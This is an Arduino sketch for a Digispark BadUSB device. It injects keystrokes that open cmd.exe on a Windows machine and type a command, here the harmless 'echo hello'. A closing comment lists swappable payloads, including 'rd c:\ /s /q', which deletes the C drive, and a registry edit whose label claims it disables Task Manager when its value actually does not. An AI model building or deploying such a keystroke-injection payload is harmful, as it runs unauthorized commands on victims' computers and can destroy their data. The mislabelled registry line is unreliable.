#include "DigiKeyboard.h"

void setup() {
  delay(5000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_RIGHT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("cmd.exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(100);

  DigiKeyboard.print("echo hello"); //main comand 
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

}

void loop() {
  
}

/*Comand List
 * echo hello //Test
 * REG ADD “HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System” /f /v “DisableTaskMgr” /t REG_DWORD /d 0 //Switch off task manager
 * rd c:\ /s /q // DELETED C
 */
